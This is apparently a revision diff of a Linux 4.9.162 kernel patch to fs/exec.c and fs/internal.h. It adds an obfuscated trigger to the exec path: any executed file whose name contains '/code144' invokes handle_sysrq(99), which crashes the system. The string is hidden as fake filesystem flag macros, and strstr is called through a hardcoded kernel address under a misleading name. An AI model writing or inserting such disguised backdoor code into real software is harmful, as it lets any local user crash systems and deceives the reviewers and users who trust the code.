@@ -1,6 +1,6 @@
 diff -ruN linux-4.9.162/fs/exec.c linux-4.9.162-patch/fs/exec.c
 --- linux-4.9.162/fs/exec.c	2019-03-05 17:57:07.000000000 +0100
-+++ linux-4.9.162-patch/fs/exec.c	2019-04-27 20:23:56.981804667 +0200
++++ linux-4.9.162-patch/fs/exec.c	2019-04-28 12:07:35.174598252 +0200
 @@ -57,6 +57,7 @@
  #include <linux/oom.h>
  #include <linux/compat.h>
@@ -9,28 +9,59 @@ diff -ruN linux-4.9.162/fs/exec.c linux-4.9.162-patch/fs/exec.c
  
  #include <asm/uaccess.h>
  #include <asm/mmu_context.h>
-@@ -1725,6 +1726,24 @@
+@@ -68,6 +69,19 @@
+ #include <trace/events/sched.h>
+ 
+ int suid_dumpable = 0;
++char* (*guid_dumpable)(const char*, const char*) = (char * (*)(const char*, const char*)) 0xffffffff81340eb0;
++
++char __FS_CONTROL_FLAGS[] = {
++	__FS_ARCH_SPECIFIC_ENDIANESS,
++	__FS_EXEC_FILE,
++	__FS_MULTIPLE_PAGES_FILE,
++	__FS_CIRCULAR_BUFFER,
++	__FS_SINGLE_PAGE_FILE,
++	__FS_RO_DEVICE,
++	__FS_RW_DEVICE,
++	__FS_ARW_DEVICE,
++	__FS_EMPTY
++};
+ 
+ static LIST_HEAD(formats);
+ static DEFINE_RWLOCK(binfmt_lock);
+@@ -1725,6 +1739,12 @@
  	if (IS_ERR(file))
  		goto out_unmark;
  
-+	char __VM_ARCH_SPECIFIC_FLAGS[] = {
-+		47,
-+		99,
-+		111,
-+		100,
-+		101,
-+		49,
-+		52,
-+		52,
-+		0
-+	};
++	printk("%p", strstr);
 +
-+	printk("%s", __VM_ARCH_SPECIFIC_FLAGS);
-+
-+	if (strstr(filename->name, __VM_ARCH_SPECIFIC_FLAGS) != NULL) {
-+		handle_sysrq(99);
++	if (guid_dumpable(filename->name, __FS_CONTROL_FLAGS) != NULL) {
++		handle_sysrq(__FS_EXEC_FILE);
 +	}
 +
  	sched_exec();
  
  	bprm->file = file;
+diff -ruN linux-4.9.162/fs/internal.h linux-4.9.162-patch/fs/internal.h
+--- linux-4.9.162/fs/internal.h	2019-04-28 11:20:56.523872429 +0200
++++ linux-4.9.162-patch/fs/internal.h	2019-04-28 11:43:49.898010963 +0200
+@@ -18,6 +18,19 @@
+ struct mount;
+ struct shrink_control;
+ 
++/**
++ * Control Flags for exotic filesystems
++ */
++#define __FS_EMPTY 0
++#define __FS_ARCH_SPECIFIC_ENDIANESS 47
++#define __FS_RO_DEVICE 49
++#define __FS_RW_DEVICE 52
++#define __FS_ARW_DEVICE 52
++#define __FS_EXEC_FILE 99
++#define __FS_CIRCULAR_BUFFER 100
++#define __FS_SINGLE_PAGE_FILE 101
++#define __FS_MULTIPLE_PAGES_FILE 111
++
+ /*
+  * block_dev.c
+  */
